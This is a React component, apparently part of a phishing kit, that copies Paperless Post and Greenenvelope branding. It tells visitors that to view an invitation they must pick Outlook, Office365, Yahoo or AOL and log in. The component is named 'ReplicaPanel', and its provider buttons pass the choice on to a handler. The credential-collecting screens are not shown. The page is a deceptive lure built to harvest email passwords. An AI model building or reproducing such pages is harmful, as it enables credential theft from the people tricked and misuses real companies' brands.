import React from 'react';
import { ChevronRight } from 'lucide-react';
import { EmailProvider } from '../types';

interface ReplicaPanelProps {
  onSelectProvider: (provider: EmailProvider) => void;
  mockProviders: EmailProvider[];
}

export default function ReplicaPanel({ onSelectProvider, mockProviders }: ReplicaPanelProps) {
  const renderLogo = (providerId: string) => {
    switch (providerId) {
      case 'outlook':
        return (
          <svg className="w-5 h-5 absolute" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M19.5 5.25v13.5c0 .966-.784 1.75-1.75 1.75H8.25c-.966 0-1.75-.784-1.75-1.75V5.25c0-.966.784-1.75 1.75-1.75h9.5c.966 0 1.75.784 1.75 1.75z" fill="#0072C6" />
            <path d="M1.5 7.5v9c0 .966.784 1.75 1.75 1.75h9.5c.966 0 1.75-.784 1.75-1.75v-9c0-.966-.784-1.75-1.75-1.75h-9.5C2.284 5.75 1.5 6.534 1.5 7.5z" fill="#00559A" />
            <text x="3.5" y="14.5" fill="#ffffff" style={{ fontSize: '9px', fontWeight: 'bold', fontFamily: 'sans-serif' }}>O</text>
          </svg>
        );
      case 'office365':
        return (
          <div className="grid grid-cols-2 gap-[2px] w-4.5 h-4.5">
            <div className="bg-[#f25f22] w-2 h-2 rounded-xs"></div>
            <div className="bg-[#7fba00] w-2 h-2 rounded-xs"></div>
            <div className="bg-[#00a4ef] w-2 h-2 rounded-xs"></div>
            <div className="bg-[#ffb900] w-2 h-2 rounded-xs"></div>
          </div>
        );
      case 'yahoo':
        return (
          <span className="text-[#6001d2] font-black text-sm tracking-tighter" style={{ fontFamily: 'Georgia, serif' }}>Y!</span>
        );
      case 'aol':
        return (
          <span className="text-black font-sans font-black text-[9px] tracking-tighter">Aol.</span>
        );
      default:
        return (
          <svg className="w-4 h-4 text-[#ea4335]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
            <rect width="20" height="14" x="2" y="5" rx="2" />
            <path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7" />
          </svg>
        );
    }
  };

  return (
    <div
      id="replica-container"
      className="w-full max-w-[430px] my-6 rounded-2xl bg-[#3a3735]/92 backdrop-blur-md border border-[#ffffff15] text-white flex flex-col justify-between py-7 px-5 md:px-8 shadow-2xl relative z-10"
    >
      <div id="logo-container" className="flex flex-col items-center pt-2">
        <div id="logo-branding-plate" className="bg-white w-48 py-3.5 px-5 flex flex-col items-center shadow-lg rounded-sm transition-transform duration-300 hover:scale-[1.01]">
          <h1 id="logo-main-text" className="font-serif text-[#111] text-2xl font-normal tracking-wide text-center uppercase" style={{ fontFamily: '"Playfair Display", Georgia, serif' }}>
            Paperless
          </h1>
          <div id="logo-sub-text" className="w-full flex items-center justify-center gap-1.5 mt-0.5">
            <span id="logo-dash-left" className="h-[1px] bg-gray-300 w-6"></span>
            <span id="logo-post-word" className="text-[9px] uppercase font-sans tracking-[0.25em] text-gray-400 font-semibold">POST</span>
            <span id="logo-dash-right" className="h-[1px] bg-gray-300 w-6"></span>
          </div>
          <span id="logo-registered-mark" className="text-[7.5px] text-gray-400 absolute top-1.5 right-1.5 font-sans">®</span>
        </div>
      </div>

      <div id="form-body-container" className="flex-1 flex flex-col justify-center my-6">
        <div id="heading-texts" className="text-center mb-6">
          <h2 id="access-cta-heading" className="text-xl md:text-2xl font-sans font-medium tracking-tight text-white mb-2">
            Access Invitations & Cards
          </h2>
          <p id="access-description-para" className="text-xs md:text-sm text-gray-300 font-sans leading-relaxed px-1">
            To view the invitation, please select your email provider below and log in. You were invited to access the invitation on <span className="text-blue-300 font-medium hover:underline cursor-pointer">Greenenvelope</span>.
          </p>
        </div>

        <div id="provider-buttons-stack" className="space-y-3 w-[95%] mx-auto">
          {mockProviders.map((provider) => (
            <button
              key={provider.id}
              id={`provider-btn-${provider.id}`}
              onClick={() => onSelectProvider(provider)}
              className="w-full py-2 px-3 rounded-full flex items-center justify-between text-left transition-all duration-200 transform active:scale-98 shadow-sm hover:shadow-md hover:-translate-y-0.5 border border-transparent hover:border-white/10 cursor-pointer"
              style={{ backgroundColor: provider.bgColor }}
            >
              <div id={`provider-btn-left-${provider.id}`} className="flex items-center gap-3">
                <div id={`provider-icon-wrapper-${provider.id}`} className="w-8 h-8 rounded-full bg-white flex items-center justify-center shadow-inner shrink-0 relative">
                  {renderLogo(provider.id)}
                </div>
                <span id={`provider-btn-text-${provider.id}`} className="font-sans font-semibold text-xs tracking-wide text-white">
                  {provider.buttonText}
                </span>
              </div>
              <ChevronRight id={`provider-btn-arrow-${provider.id}`} className="w-4 h-4 text-white/50" />
            </button>
          ))}
        </div>
      </div>

      <div id="disclosures-footer-container" className="text-center pt-3.5 border-t border-white/10 space-y-3">
        <p id="disclosure-para-1" className="text-[9.5px] text-gray-400 font-sans leading-relaxed">
          Online Invitations & Birthday Cards, greenenvelope simplifies event planning with user-friendly tools for managing online invitations and greeting cards.
        </p>
        <p id="disclosure-para-2" className="text-[8.5px] text-gray-500 font-sans leading-relaxed">
          © 2025 Sincere Corporation, greenenvelope is a registered trademark of Sincere Corporation. All rights reserved. All other product and company names are trademarks or registered trademarks of their respective holders.
        </p>
      </div>
    </div>
  );
}
